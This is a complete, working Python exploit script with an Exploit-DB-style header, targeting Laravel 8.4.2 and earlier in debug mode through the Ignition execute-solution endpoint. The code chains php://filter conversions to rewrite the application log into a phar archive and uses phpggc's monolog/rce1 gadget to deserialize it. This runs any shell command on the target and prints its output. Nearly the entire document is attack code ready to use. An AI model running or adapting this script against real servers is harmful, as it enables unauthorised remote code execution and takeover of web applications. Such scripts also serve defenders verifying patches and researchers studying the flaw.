# Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
# Date: 1.14.2021
# Exploit Author: SunCSR Team
# Vendor Homepage: https://laravel.com/
# References:
# https://www.ambionics.io/blog/laravel-debug-rce
# https://viblo.asia/p/6J3ZgN8PKmB
# Version: <= 8.4.2
# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce


#!/usr/bin/env python3

import requests, sys, re, os

header={
    "Accept": "application/json"
}

data = {
        "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",\
        "parameters":{
            "variableName":"cm0s",
            "viewFile":""
        }
    }

def clear_log(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    while (requests.post(url=url, json=data, headers=header, verify=False).status_code != 200): pass
    requests.post(url=url, json=data, headers=header, verify=False)
    requests.post(url=url, json=data, headers=header, verify=False)

def create_payload(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 500 and f'file_get_contents({viewFile})' in resp.text:
        return True
    return False

def convert(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 200:
        return True
    return False

def exploited(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 500 and 'cannot be empty' in resp.text:
        m = re.findall(r'\{(.|\n)+\}((.|\n)*)', resp.text)
        print()
        print(m[0][1])

def generate_payload(command='', padding=0):
    if '/' in command:
        command = command.replace('/', '\/')
        command = command.replace('\'', '\\\'')
    os.system(r'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' > payload.txt'''%(command))
    payload = ''
    with open('payload.txt', 'r') as fp:
        payload = fp.read()
        payload = payload.replace('==', '=3D=')
        for i in range(padding):
            payload += '=00'
    os.system('rm -rf payload.txt')
    return payload


def main():

    if len(sys.argv) < 4:
        print('Usage:  %s url path-log command\n'%(sys.argv[0]))
        print('\tEx: %s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log \'id\''%(sys.argv[0]))
        exit(1)

    if not os.path.isfile('./phpggc/phpggc'):
        print('Phpggc not found!')
        print('Run command: git clone https://github.com/ambionics/phpggc.git')
        os.system('git clone https://github.com/ambionics/phpggc.git')

    url = sys.argv[1]
    path_log = sys.argv[2]
    command = sys.argv[3]
    padding = 0

    payload = generate_payload(command, padding)
    if not payload:
        print('Generate payload error!')
        exit(1)

    if 'http' not in url and 'https' not in url:
        url = 'http'+url
    else:
        url = url+'/_ignition/execute-solution'

    print('\nExploit...')
    clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
    create_payload(url, 'AA')
    create_payload(url, payload)
    while (not convert(url, 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s'%(path_log))):
        clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
        create_payload(url, 'AA')
        padding += 1
        payload = generate_payload(command, padding)
        create_payload(url, payload)

    exploited(url, 'phar://%s'%(path_log))

if __name__ == '__main__':
    main()